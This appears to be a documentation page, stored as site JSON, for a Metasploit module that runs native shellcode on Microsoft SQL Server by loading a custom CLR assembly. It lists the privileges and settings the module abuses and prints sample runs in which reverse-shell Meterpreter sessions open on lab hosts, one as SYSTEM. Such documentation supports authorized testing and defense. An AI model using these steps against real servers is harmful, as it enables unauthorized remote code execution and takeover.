{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/mssql/mssql_clr_payload","result":{"data":{"moduleMetadataJson":{"id":"a227a385-c4ba-5f94-9e61-a782c689ddb0","name":"Microsoft SQL Server Clr Stored Procedure Payload Execution","fullname":"exploit/windows/mssql/mssql_clr_payload","description":"This module executes an arbitrary native payload on a Microsoft SQL\n        server by loading a custom SQL CLR Assembly into the target SQL\n        installation, and calling it directly with a base64-encoded payload.\n\n        The module requires working credentials in order to connect directly to the\n        MSSQL Server.\n\n        This method requires the user to have sufficient privileges to install a custom\n        SQL CRL DLL, and invoke the custom stored procedure that comes with it.\n\n        This exploit does not leave any binaries on disk.\n\n        Tested on MS SQL Server versions: 2005, 2012, 2016 (all x64).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/mssql/mssql_clr_payload","documentationSlug":"/modules/documentation/exploit/windows/mssql/mssql_clr_payload","referencesSlug":"/modules/references/exploit/windows/mssql/mssql_clr_payload"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module is based on the work that was done by @leechristensen and @sekirkity as documented <a href=\"http://sekirkity.com/command-execution-in-sql-server-via-fileless-clr-based-custom-stored-procedure/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">here</a>.</p>\n<h2 id=\"prerequisites\" style=\"position:relative;\"><a href=\"#prerequisites\" aria-label=\"prerequisites permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Prerequisites</h2>\n<p>The module requires SQL credentials for a user with sufficient privileges to:</p>\n<ul>\n<li>Enable CLR support (if not already enabled).</li>\n<li>Enabled <code class=\"language-text\">TRUSTWORTHY</code> (if not already enabled).</li>\n<li>Add an assembly to the server.</li>\n<li>Create a new stored procedure.</li>\n</ul>\n<p>The module does all of the above, as required. It uploads a .NET Assembly (pre-built, and stored in the <code class=\"language-text\">data</code> folder) which is selected based on the version of the DB in question. This is a shim that exposes a function that allows for a base64-encoded payload to be executed as native shellcode. This function is exposed as a stored proc, which can be called directly through an SQL query with the base64 encoded shellcode.</p>\n<p>This module was tested on SQL 2005, 2012 and 2016 (all x64 versions). I haven't tested on x86 yet. there is code in the module that makes sure that the target architecture matches the payload that was chosen.</p>\n<p>This code also includes command-line builds for the assembly that is used to provide the code execution function, and can be built in the same way that all the other exploits are built (from a Visual Studio command line).</p>\n<h2 id=\"sample-runs\" style=\"position:relative;\"><a href=\"#sample-runs\" aria-label=\"sample runs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Sample Runs:</h2>\n<p>MS SQL 2005:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(mssql_clr_payload) &gt; exploit\n\n[*] [2017.02.10-12:56:15] Started reverse TCP handler on 172.16.255.1:4444\n[!] [2017.02.10-12:56:15] 172.16.255.130:1433 - Setting EXITFUNC to &#39;thread&#39; so we don&#39;t kill SQL Server\n[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Database does not have TRUSTWORTHY setting on, enabling ...\n[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Database does not have CLR support enabled, enabling ...\n[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Using version v3.5 of the Payload Assembly\n[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Adding custom payload assembly ...\n[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Exposing payload execution stored procedure ...\n[*] [2017.02.10-12:56:15] 172.16.255.130:1433 - Executing the payload ...\n[*] [2017.02.10-12:56:16] 172.16.255.130:1433 - Removing stored procedure ...\n[*] [2017.02.10-12:56:16] 172.16.255.130:1433 - Removing assembly ...\n[*] [2017.02.10-12:56:16] Sending stage (1189423 bytes) to 172.16.255.130\n[*] [2017.02.10-12:56:16] 172.16.255.130:1433 - Restoring CLR setting ...\n[*] [2017.02.10-12:56:16] 172.16.255.130:1433 - Restoring Trustworthy setting ...\n[*] Meterpreter session 10 opened (172.16.255.1:4444 -&gt; 172.16.255.130:49168) at 2017-02-10 12:56:18 +1000\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : WIN-8CT6HVI5D6J\nOS              : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>MS SQL 2016</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(mssql_clr_payload) &gt; exploit\n\n[*] [2017.02.10-12:55:58] Started reverse TCP handler on 172.16.255.1:4444\n[!] [2017.02.10-12:55:58] 172.16.255.129:1433 - Setting EXITFUNC to &#39;thread&#39; so we don&#39;t kill SQL Server\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Database does not have TRUSTWORTHY setting on, enabling ...\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Database does not have CLR support enabled, enabling ...\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Using version v4.0 of the Payload Assembly\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Adding custom payload assembly ...\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Exposing payload execution stored procedure ...\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Executing the payload ...\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Removing stored procedure ...\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Removing assembly ...\n[*] [2017.02.10-12:55:58] Sending stage (1189423 bytes) to 172.16.255.129\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Restoring CLR setting ...\n[*] [2017.02.10-12:55:58] 172.16.255.129:1433 - Restoring Trustworthy setting ...\n[*] Meterpreter session 9 opened (172.16.255.1:4444 -&gt; 172.16.255.129:49732) at 2017-02-10 12:56:00 +1000\n\nmeterpreter &gt; getuid\nServer username: NT Service\\MSSQLSERVER\nmeterpreter &gt; sysinfo\nComputer        : WIN-7QEE7C4D0GF\nOS              : Windows 2016 (Build 14393).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a227a385-c4ba-5f94-9e61-a782c689ddb0"}}}